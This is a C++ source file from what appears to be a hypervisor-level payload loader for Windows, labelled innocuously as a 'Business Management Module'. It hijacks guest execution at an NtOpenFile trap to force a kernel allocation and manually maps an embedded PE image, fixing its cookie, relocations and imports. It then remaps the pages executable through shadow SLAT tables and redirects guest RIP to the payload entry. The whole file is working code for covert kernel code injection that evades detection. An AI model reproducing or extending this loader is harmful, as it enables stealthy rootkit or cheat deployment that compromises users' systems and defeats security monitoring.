// =============================================================================
// VMM Shadow Mapper - Payload Deployer (Business Management Module)
// Coordinates loading of RWbase payloads
// =============================================================================

#include "deployer.h"
#include "modules/loader/pe.h"
#include "modules/loader/reloc.h"
#include "modules/loader/imports.h"
#include "modules/loader/cookie.h"
#include "modules/loader/guest.h"
#include "modules/logs/logs.h"
#include "modules/crt/crt.h"
#include "modules/memory_manager/memory_manager.h"
#include "modules/memory_manager/heap_manager.h"
#include "modules/slat/slat.h"
#include "modules/slat/cr3/cr3.h"
#include "modules/slat/cr3/pte.h"
#include "modules/arch/arch.h"
#include <intrin.h>

// Include the generated payload binaries
#include <payload/payload_bin.h>

// Access to global runtime context for injection state
#include "../../runtime/runtime_context.h"

namespace loader {

// =============================================================================
// Allocation Tracking
// =============================================================================

struct allocation_info_t {
    uint64_t guest_physical_base;   // Guest physical address
    uint64_t guest_virtual_base;    // Guest kernel VA (for relocations)
    void*    vmm_mapped_address;    // VMM-accessible address for modification
    uint32_t size;                  // Allocated size
    uint32_t page_count;            // Number of 4KB pages
};

// =============================================================================
// Payload Validation
// =============================================================================

/**
 * @description 校验 Payload 是否为合法 PE64 镜像。
 * @param {const unsigned char*} data Payload 数据指针。
 * @param {const size_t} size Payload 数据大小。
 * @return {bool} 是否为合法 PE64。
 * @throws {无} 不抛出异常。
 */
bool validate_payload(const unsigned char* data, const size_t size)
{
    if (!data || size < sizeof(image_dos_header_t)) {
        return false;
    }

    const auto dos = reinterpret_cast<const image_dos_header_t*>(data);
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        return false;
    }

    if (static_cast<size_t>(dos->e_lfanew) + sizeof(image_nt_headers64_t) > size) {
        return false;
    }

    const auto nt = reinterpret_cast<const image_nt_headers64_t*>(data + dos->e_lfanew);
    if (nt->signature != IMAGE_NT_SIGNATURE) {
        return false;
    }

    if (nt->optional_header.magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
        return false;
    }

    return true;
}

/**
 * @description 判断内置 Payload 是否已准备就绪。
 * @return {bool} 是否准备就绪。
 */
bool is_payload_ready()
{
    return validate_payload(payload::rwbase_image, payload::rwbase_image_size);
}

// =============================================================================
// Guest Memory Allocation
// =============================================================================

/**
 * @description 为 Payload 分配来宾可访问的物理内存并映射到 VMM。
 * @param {context_t*} ctx 加载器上下文。
 * @param {const uint32_t} size 申请大小（字节）。
 * @param {allocation_info_t*} out_info 输出分配信息。
 * @return {bool} 是否分配成功。
 */
static bool allocate_guest_memory(
    context_t* ctx,
    const uint32_t size,
    allocation_info_t* out_info)
{
    if (!out_info || !ctx) {
        return false;
    }

    const uint32_t pages_needed = (size + 0xFFF) / 0x1000;
    
    logs::print(ctx->log_ctx, "[Loader] Allocating %d pages (%d bytes) in Guest space...\n", 
        pages_needed, size);

    void* vmm_base = heap_manager::allocate_page(ctx->heap_ctx);
    if (!vmm_base) {
        logs::print(ctx->log_ctx, "[Loader] Failed to allocate initial page\n");
        return false;
    }

    for (uint32_t i = 1; i < pages_needed; i++) {
        void* page = heap_manager::allocate_page(ctx->heap_ctx);
        if (!page) {
            logs::print(ctx->log_ctx, "[Loader] Failed to allocate page %d of %d\n", i + 1, pages_needed);
            return false;
        }
        if (reinterpret_cast<uint8_t*>(page) != 
            reinterpret_cast<uint8_t*>(vmm_base) + (i * 0x1000)) {
            logs::print(ctx->log_ctx, "[Loader] ERROR: Non-contiguous allocation\n");
            return false;
        }
    }

    const uint64_t vmm_va = reinterpret_cast<uint64_t>(vmm_base);
    const uint64_t heap_va_base = reinterpret_cast<uint64_t>(
        memory_manager::map_host_physical(ctx->heap_ctx->initial_physical_base));
    
    const uint64_t guest_physical = ctx->heap_ctx->initial_physical_base + (vmm_va - heap_va_base);

    logs::print(ctx->log_ctx, "[Loader] VMM VA: 0x%p, Guest PA: 0x%p\n", vmm_va, guest_physical);

    out_info->guest_physical_base = guest_physical;
    out_info->guest_virtual_base = 0;
    out_info->vmm_mapped_address = vmm_base;
    out_info->size = size;
    out_info->page_count = pages_needed;

    return true;
}

// =============================================================================
// Section Mapping
// =============================================================================

/**
 * @description 将 PE 各节区映射到目标地址。
 * @param {void*} dest 目标地址（VMM 可写）。
 * @param {const unsigned char*} src 源镜像数据。
 * @param {const size_t} src_size 源镜像大小。
 * @return {bool} 是否映射成功。
 */
static bool map_sections(void* dest, const unsigned char* src, const size_t src_size)
{
    const auto dos = reinterpret_cast<const image_dos_header_t*>(src);
    const auto nt = reinterpret_cast<const image_nt_headers64_t*>(src + dos->e_lfanew);
    
    const uint32_t headers_size = nt->optional_header.size_of_headers;
    crt::copy_memory(dest, src, headers_size);

    const auto sections = reinterpret_cast<const image_section_header_t*>(
        reinterpret_cast<const uint8_t*>(&nt->optional_header) + 
        nt->file_header.size_of_optional_header
    );

    for (uint16_t i = 0; i < nt->file_header.number_of_sections; i++) {
        const auto& section = sections[i];

        if (section.size_of_raw_data == 0) {
            continue;
        }

        if (section.pointer_to_raw_data + section.size_of_raw_data > src_size) {
            return false;
        }

        void* dest_section = reinterpret_cast<uint8_t*>(dest) + section.virtual_address;
        const void* src_section = src + section.pointer_to_raw_data;
        
        crt::copy_memory(dest_section, src_section, section.size_of_raw_data);

        if (section.virtual_size > section.size_of_raw_data) {
            const uint32_t padding = section.virtual_size - section.size_of_raw_data;
            crt::set_memory(
                reinterpret_cast<uint8_t*>(dest_section) + section.size_of_raw_data,
                0,
                padding
            );
        }
    }

    return true;
}

static bool map_payload_pages_to_guest(context_t* ctx, const allocation_info_t& alloc, const uint64_t target_guest_base)
{
    auto& slat_ctx = g_runtime_context.slat_ctx;
    const cr3 hyperv_cr3 = slat::hyperv_cr3(&slat_ctx);
    const cr3 hook_cr3 = slat::hook_cr3(&slat_ctx);

    for (uint32_t i = 0; i < alloc.page_count; i++)
    {
        virtual_address_t guest_va = {};
        guest_va.address = target_guest_base + (static_cast<uint64_t>(i) * 0x1000);

        const uint64_t guest_physical = memory_manager::translate_guest_virtual_address(
            ctx->guest_cr3, ctx->slat_cr3, guest_va, nullptr);

        if (guest_physical == 0)
        {
            logs::print(ctx->log_ctx, "[Loader] ERROR: Guest VA not mapped: 0x%p\n", guest_va.address);
            return false;
        }

        virtual_address_t guest_physical_va = {};
        guest_physical_va.address = guest_physical;

        slat_pte* const hyperv_pte = slat::get_pte(hyperv_cr3, guest_physical_va, slat_ctx.heap_ctx, 1);
        slat_pte* const hook_pte = slat::get_pte(hook_cr3, guest_physical_va, slat_ctx.heap_ctx, 1);

        if (hyperv_pte == nullptr || hook_pte == nullptr)
        {
            logs::print(ctx->log_ctx, "[Loader] ERROR: Failed to get SLAT PTE for 0x%p\n", guest_physical);
            return false;
        }

        const uint64_t shadow_host_physical = memory_manager::unmap_host_physical(
            reinterpret_cast<const uint8_t*>(alloc.vmm_mapped_address) + (static_cast<uint64_t>(i) * 0x1000));

        hyperv_pte->page_frame_number = shadow_host_physical >> 12;
        hyperv_pte->read_access = 1;
        hyperv_pte->write_access = 1;
        hyperv_pte->execute_access = 1;

        hook_pte->page_frame_number = shadow_host_physical >> 12;
        hook_pte->read_access = 1;
        hook_pte->write_access = 1;
        hook_pte->execute_access = 1;
    }

    slat::flush_current_logical_processor_cache(1);
    return true;
}

// =============================================================================
// Dynamic Injection Helpers (Stage Machine Support)
// =============================================================================

bool prepare_allocation_hijack(context_t* ctx, void* trap_frame_ptr)
{
    trap_frame_t* tf = reinterpret_cast<trap_frame_t*>(trap_frame_ptr);

    // Fix: Read RSP from VMCS as tf->rsp might be unreliable (especially for #DB exits)
    // The original Hyper-V handler might not populate RSP in the trap frame for all exit types.
    tf->rsp = arch::get_guest_rsp();

    const uint64_t guest_rsp = tf->rsp;

    auto& inject_ctx = g_runtime_context.injection_ctx;

    // 1. Resolve Allocation API if not already resolved
    if (inject_ctx.allocation_routine == 0) {
        if (g_runtime_context.ntoskrnl_base == 0) return false;
        
        inject_ctx.allocation_routine = resolve_mm_allocate_independent_pages_ex(g_runtime_context.ntoskrnl_base);
        if (inject_ctx.allocation_routine == 0) {
             logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to resolve MmAllocateIndependentPagesEx\n");
             return false;
        }
    }

    // 2. Backup Context
    crt::copy_memory(&inject_ctx.saved_guest_context, tf, sizeof(trap_frame_t));
    inject_ctx.saved_rip = arch::get_guest_rip(); // Save original RIP (NtOpenFile entry)

    // 3. Prepare Arguments for MmAllocateIndependentPagesEx
    // PVOID MmAllocateIndependentPagesEx(SIZE_T NumberOfBytes, ULONG Node, ULONG64 AllocationType, ULONG64 Protect);
    
    const auto dos = reinterpret_cast<const image_dos_header_t*>(payload::rwbase_image);
    const auto nt = reinterpret_cast<const image_nt_headers64_t*>(payload::rwbase_image + dos->e_lfanew);
    const uint32_t image_size = nt->optional_header.size_of_image;

    tf->rcx = image_size;                 // NumberOfBytes (Virtual Size)
    tf->rdx = 0xFFFFFFFF;                 // Node (Current)
    tf->r8 = 0;                           // AllocationType (Normal)
    tf->r9 = 0x20;                        // Protect (PAGE_EXECUTE_READ)

    // 4. Setup Stack (Shadow Space + Return Address)
    // We need to write to Guest Stack. We need to map Guest RSP to Host VA.
    // NOTE: This assumes we can access Guest RAM.

    // Stack Alignment Logic:
    // Windows x64 ABI requires RSP to be 16-byte aligned AFTER the CALL instruction pushes the return address.
    // This means BEFORE the CALL (at the call site), RSP should be 16-byte aligned.
    // When our hijacked function starts, it expects (RSP + 8) to be 16-byte aligned.
    // So the RSP value we set (which points to the return address) must be such that (NewRSP + 8) % 16 == 0.
    // Which means NewRSP % 16 == 8.
    
    // Let's reserve space for:
    // - Shadow Space (32 bytes / 0x20)
    // - Return Address (8 bytes / 0x08)
    // Total decrement needs to land us at an address ending in 8.
    
    // First, align current RSP down to 16 bytes to be safe as a base.
    uint64_t aligned_base_rsp = guest_rsp & ~0xF; 
    
    // We need NewRSP to point to the Return Address.
    // The function will push RBP etc, and subtract from RSP.
    // But at the entry (our hijack target), RSP points to Return Address.
    // So NewRSP must be 8 modulo 16.
    
    // If we subtract 0x28 (40 bytes) from an aligned base:
    // AlignedBase (0x...0) - 0x28 = 0x...D8. 
    // 0xD8 % 16 = 216 % 16 = 8.  (Correct!)
    
    // So: Align guest RSP down to 16, then subtract 0x28.
    // 0x20 (Shadow) + 0x8 (RetAddr) = 0x28.
    const uint64_t new_rsp = aligned_base_rsp - 0x28;
    const uint64_t required_stack = 0x200;
    if (new_rsp < required_stack) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Guest RSP too low for hijack. RSP=%p NewRSP=%p\n", guest_rsp, new_rsp);
        return false;
    }

    const uint64_t probe_start = (new_rsp - required_stack) & ~0xFFFull;
    const uint64_t probe_end = ((new_rsp + 0x20) & ~0xFFFull) + 0x1000;
    for (uint64_t probe = probe_start; probe < probe_end; probe += 0x1000) {
        virtual_address_t gva_probe = {};
        gva_probe.address = probe;
        const uint64_t probe_pa = memory_manager::translate_guest_virtual_address(
            arch::get_guest_cr3(),
            slat::hyperv_cr3(&g_runtime_context.slat_ctx),
            gva_probe
        );
        if (probe_pa == 0) {
            logs::print(ctx->log_ctx, "[Injection] ERROR: Guest stack guard reached. RSP=%p NewRSP=%p Probe=%p\n", guest_rsp, new_rsp, probe);
            return false;
        }
    }

    // Translate new_rsp to Host PA/VA
    virtual_address_t gva_rsp = {};
    gva_rsp.address = new_rsp;

    const uint64_t guest_pa = memory_manager::translate_guest_virtual_address(
        arch::get_guest_cr3(),
        slat::hyperv_cr3(&g_runtime_context.slat_ctx), 
        gva_rsp
    );

    if (guest_pa == 0) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to translate Guest RSP. RSP=%p NewRSP=%p CR3=%p\n", 
            guest_rsp, new_rsp, arch::get_guest_cr3().flags);
        return false;
    }

    void* host_stack_ptr = memory_manager::map_guest_physical(
        slat::hyperv_cr3(&g_runtime_context.slat_ctx),
        guest_pa
    );
    if (!host_stack_ptr) {
         logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to map Guest Stack\n");
         return false;
    }

    // Write Magic Trap Return Address
    *reinterpret_cast<uint64_t*>(host_stack_ptr) = injection_ctx_t::MAGIC_TRAP_RIP;

    // 5. Update Trap Frame
    tf->rsp = new_rsp;
    arch::set_guest_rsp(new_rsp); // Update VMCS
    arch::set_guest_rip(inject_ctx.allocation_routine);

    // Enable #PF Interception to catch return from unmapped Magic Trap address
    uint64_t exception_bitmap = 0;
    __vmx_vmread(VMCS_CTRL_EXCEPTION_BITMAP, &exception_bitmap);
    exception_bitmap |= (1ULL << 14); // Enable #PF (Vector 14)
    __vmx_vmwrite(VMCS_CTRL_EXCEPTION_BITMAP, exception_bitmap);

    logs::print(ctx->log_ctx, "[Injection] Stage 1: Hijacked execution for Allocation. RIP=0x%p. Enabled #PF trap.\n", inject_ctx.allocation_routine);
    return true;
}

bool harvest_allocation_result(context_t* ctx, void* trap_frame_ptr)
{
    trap_frame_t* tf = reinterpret_cast<trap_frame_t*>(trap_frame_ptr);
    auto& inject_ctx = g_runtime_context.injection_ctx;

    // 1. Capture Result
    const uint64_t allocated_base = tf->rax;
    const uint64_t allocated_size = tf->rcx; // RCX was passed as Size, but is volatile. We should use our saved size or just trust we got what we asked.
    // Actually, MmAllocateIndependentPagesEx returns PVOID, not a structure with size.
    // But we know the size we requested: saved_guest_context doesn't have it, but we computed it from payload.
    
    inject_ctx.allocated_buffer = allocated_base;
    inject_ctx.payload_guest_base.store(allocated_base, std::memory_order_release);
    
    const auto dos = reinterpret_cast<const image_dos_header_t*>(payload::rwbase_image);
    const auto nt = reinterpret_cast<const image_nt_headers64_t*>(payload::rwbase_image + dos->e_lfanew);
    const uint32_t image_size = nt->optional_header.size_of_image;

    logs::print(ctx->log_ctx, "[Injection] Stage 2: Allocation captured. Base=0x%p Size=0x%X\n", allocated_base, image_size);

    return true;
}

bool execute_payload_hijack(context_t* ctx, void* trap_frame_ptr)
{
    trap_frame_t* tf = reinterpret_cast<trap_frame_t*>(trap_frame_ptr);
    auto& inject_ctx = g_runtime_context.injection_ctx;
    bool success = true;
    uint64_t entry_va = 0;
    bool handoff_to_payload = false;
    uint64_t payload_rsp = 0;
    virtual_address_t payload_rsp_va = {};
    uint64_t payload_rsp_pa = 0;
    void* host_stack_ptr = nullptr;
    uint64_t exception_bitmap = 0;

    // 1. Get Image Info
    const auto dos = reinterpret_cast<const image_dos_header_t*>(payload::rwbase_image);
    const auto nt = reinterpret_cast<const image_nt_headers64_t*>(payload::rwbase_image + dos->e_lfanew);
    const uint32_t image_size = nt->optional_header.size_of_image;

    const uint64_t target_va = inject_ctx.payload_guest_base.load(std::memory_order_acquire);

    // logs::print(ctx->log_ctx, "[Injection] STAGE 3 SKIPPED: Allocated Address=0x%p, Size=0x%X\n", target_va, image_size);

    allocation_info_t alloc = {};
    if (!allocate_guest_memory(ctx, image_size, &alloc)) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to allocate Guest memory for RWbase\n");
        success = false;
        goto restore_context;
    }

    crt::set_memory(alloc.vmm_mapped_address, 0, image_size);
    if (!map_sections(alloc.vmm_mapped_address, payload::rwbase_image, payload::rwbase_image_size)) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to map sections\n");
        success = false;
        goto restore_context;
    }

    if (target_va == 0) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Payload Guest VA not initialized\n");
        success = false;
        goto restore_context;
    }
    inject_ctx.allocated_buffer = target_va;

    // 4. Fix Security Cookie
    if (!fix_security_cookie(ctx, alloc.vmm_mapped_address, target_va)) {
        logs::print(ctx->log_ctx, "[Injection] WARNING: Cookie fix failed\n");
    }

    // 5. Apply Relocations
    if (!apply_relocations(ctx, alloc.vmm_mapped_address, target_va)) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Relocation failed\n");
        success = false;
        goto restore_context;
    }

    // 6. Resolve Imports
    if (!resolve_payload_imports(ctx, alloc.vmm_mapped_address, g_runtime_context.ntoskrnl_base)) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Import resolution failed\n");
        success = false;
        goto restore_context;
    }

    ctx->guest_cr3 = arch::get_guest_cr3();
    ctx->slat_cr3 = slat::hyperv_cr3(&g_runtime_context.slat_ctx);

    if (!map_payload_pages_to_guest(ctx, alloc, target_va)) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to map payload into Guest via SLAT\n");
        success = false;
        goto restore_context;
    }

    // 业务说明：修正来宾页表权限以保证代码可执行。
    // 输入：guest_cr3/slat_cr3/target_va/image_size；输出：权限更新；规则：失败则终止注入；异常：不抛出。
    if (!memory_manager::set_guest_page_permissions(ctx->guest_cr3, ctx->slat_cr3, target_va, 0, image_size, true, true, true)) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to update guest PTE permissions\n");
        success = false;
        goto restore_context;
    }


    entry_va = target_va + nt->optional_header.address_of_entry_point;
    inject_ctx.payload_guest_base.store(target_va);
    inject_ctx.payload_entry.store(entry_va);

    payload_rsp = inject_ctx.saved_guest_context.rsp;
    payload_rsp &= ~0xFULL;
    payload_rsp -= 0x28;
    payload_rsp_va.address = payload_rsp;
    payload_rsp_pa = memory_manager::translate_guest_virtual_address(ctx->guest_cr3, ctx->slat_cr3, payload_rsp_va);
    if (!payload_rsp_pa) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to translate Guest RSP\n");
        success = false;
        goto restore_context;
    }

    host_stack_ptr = memory_manager::map_guest_physical(ctx->slat_cr3, payload_rsp_pa);
    if (!host_stack_ptr) {
        logs::print(ctx->log_ctx, "[Injection] ERROR: Failed to map Guest Stack\n");
        success = false;
        goto restore_context;
    }

    *reinterpret_cast<uint64_t*>(host_stack_ptr) = injection_ctx_t::MAGIC_TRAP_RIP;

    slat::flush_current_logical_processor_cache(1);
    arch::set_guest_rip(entry_va);
    arch::set_guest_rsp(payload_rsp);

    __vmx_vmread(VMCS_CTRL_EXCEPTION_BITMAP, &exception_bitmap);
    exception_bitmap |= (1ULL << 14);
    __vmx_vmwrite(VMCS_CTRL_EXCEPTION_BITMAP, exception_bitmap);

    inject_ctx.stage.store(3);
    handoff_to_payload = true;


    arch::set_guest_rflags(arch::get_guest_rflags() & ~0x100);
    if (handoff_to_payload) {
        logs::print(ctx->log_ctx, "[Injection] Stage 3: Payload deployed. Entry hijack armed.\n");
        return true;
    }
    logs::print(ctx->log_ctx, "[Injection] Stage 3: Payload deployed. Entry hijack skipped.\n");

restore_context:
    crt::copy_memory(tf, &inject_ctx.saved_guest_context, sizeof(trap_frame_t));
    arch::set_guest_rsp(tf->rsp);
    arch::set_guest_rip(inject_ctx.saved_rip);

    __vmx_vmread(VMCS_CTRL_EXCEPTION_BITMAP, &exception_bitmap);
    exception_bitmap &= ~(1ULL << 14);
    __vmx_vmwrite(VMCS_CTRL_EXCEPTION_BITMAP, exception_bitmap);

    logs::print(ctx->log_ctx, "[Injection] Stage 3: Context restored. Disabled #PF trap. Resuming original flow.\n");
    inject_ctx.stage.store(2);
    return success;
}

} // namespace loader
